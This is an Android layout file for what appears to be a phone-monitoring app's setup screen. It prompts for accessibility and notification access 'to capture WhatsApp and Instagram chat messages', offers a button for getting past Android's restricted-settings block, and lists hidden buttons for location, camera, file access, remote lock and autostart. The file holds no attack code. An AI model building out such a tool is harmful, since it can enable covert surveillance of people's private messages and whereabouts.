<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@color/background"
    android:fillViewport="true">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="20dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="@string/app_name"
            android:textColor="@color/primary"
            android:textSize="22sp"
            android:textStyle="bold"
            android:layout_marginBottom="4dp" />

        <TextView
            android:id="@+id/statusText"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="@string/main_status_active"
            android:textColor="@color/text_secondary"
            android:textSize="14sp"
            android:layout_marginBottom="20dp" />

        <!-- ACCESSIBILITY SERVICE CARD -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/cardAccessibility"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="16dp"
            app:cardCornerRadius="12dp"
            app:cardElevation="2dp"
            app:strokeWidth="1dp"
            app:strokeColor="@color/border"
            app:cardBackgroundColor="@color/card_bg">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="16dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical"
                    android:layout_marginBottom="8dp">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Accessibility Service"
                        android:textColor="@color/text_primary"
                        android:textSize="16sp"
                        android:textStyle="bold" />

                    <TextView
                        android:id="@+id/tvAccessibilityBadge"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Not Enabled"
                        android:textSize="12sp"
                        android:textStyle="bold"
                        android:paddingStart="8dp"
                        android:paddingEnd="8dp"
                        android:paddingTop="3dp"
                        android:paddingBottom="3dp"
                        android:textColor="@color/danger"
                        android:background="@color/danger_bg" />
                </LinearLayout>

                <TextView
                    android:id="@+id/tvAccessibilityDesc"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/accessibility_card_desc"
                    android:textColor="@color/text_secondary"
                    android:textSize="13sp"
                    android:lineSpacingExtra="2dp"
                    android:layout_marginBottom="14dp" />

                <!-- Prominent Enable Button -->
                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnEnableAccessibility"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/enable_accessibility"
                    android:textStyle="bold"
                    app:cornerRadius="8dp"
                    android:paddingTop="12dp"
                    android:paddingBottom="12dp"
                    android:backgroundTint="@color/accent"
                    android:textColor="@color/white"
                    android:layout_marginBottom="6dp" />

                <!-- Helper button for Android 13+ restricted settings -->
                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnOpenAppInfo"
                    style="@style/Widget.MaterialComponents.Button.TextButton"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/open_app_info"
                    android:textSize="12sp"
                    android:textColor="@color/accent" />

                <!-- Retained for backwards compatibility -->
                <Button
                    android:id="@+id/btnEnableAppBlocking"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:visibility="gone" />

            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Notification Access Card (WhatsApp & Instagram chat message capture) -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/cardNotificationAccess"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="16dp"
            app:cardCornerRadius="12dp"
            app:cardElevation="2dp"
            app:strokeColor="@color/border"
            app:strokeWidth="1dp"
            app:cardBackgroundColor="@color/white">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="16dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical"
                    android:layout_marginBottom="8dp">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Notification Access"
                        android:textColor="@color/text_primary"
                        android:textSize="16sp"
                        android:textStyle="bold" />

                    <TextView
                        android:id="@+id/tvNotificationBadge"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Not Enabled"
                        android:textSize="12sp"
                        android:textStyle="bold"
                        android:paddingStart="8dp"
                        android:paddingEnd="8dp"
                        android:paddingTop="3dp"
                        android:paddingBottom="3dp"
                        android:textColor="@color/danger"
                        android:background="@color/danger_bg" />
                </LinearLayout>

                <TextView
                    android:id="@+id/tvNotificationDesc"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Required to capture WhatsApp and Instagram chat messages and alerts in real-time."
                    android:textColor="@color/text_secondary"
                    android:textSize="13sp"
                    android:lineSpacingExtra="2dp"
                    android:layout_marginBottom="14dp" />

                <!-- Prominent Enable Button -->
                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnEnableNotification"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Enable Notification Access"
                    android:textStyle="bold"
                    app:cornerRadius="8dp"
                    android:paddingTop="12dp"
                    android:paddingBottom="12dp"
                    android:backgroundTint="@color/accent"
                    android:textColor="@color/white"
                    android:layout_marginBottom="6dp" />

                <!-- Helper button for Android 13+ restricted settings -->
                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnOpenAppInfoNotification"
                    style="@style/Widget.MaterialComponents.Button.TextButton"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:text="Allow Restricted Settings (if blocked)"
                    android:textSize="12sp"
                    android:textColor="@color/accent" />

            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Additional Permissions Section -->
        <TextView
            android:id="@+id/tvOtherPermissionsHeader"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Additional Permissions"
            android:textColor="@color/text_primary"
            android:textSize="14sp"
            android:textStyle="bold"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnGrantCameraPermission"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/grant_camera_permission"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnGrantUsageAccess"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/grant_usage_access"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnGrantBackgroundLocation"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/grant_background_location"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnEnableRemoteLock"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/enable_remote_lock"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnGrantFileAccess"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/grant_file_access"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnGrantBatteryExemption"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/grant_battery_exemption"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <Button
            android:id="@+id/btnGrantAutostart"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/grant_autostart"
            android:visibility="gone"
            android:layout_marginBottom="10dp" />

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnSyncNow"
            style="@style/Widget.MaterialComponents.Button.OutlinedButton"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="@string/sync_now"
            android:layout_marginTop="10dp"
            android:layout_marginBottom="24dp" />

    </LinearLayout>
</ScrollView>
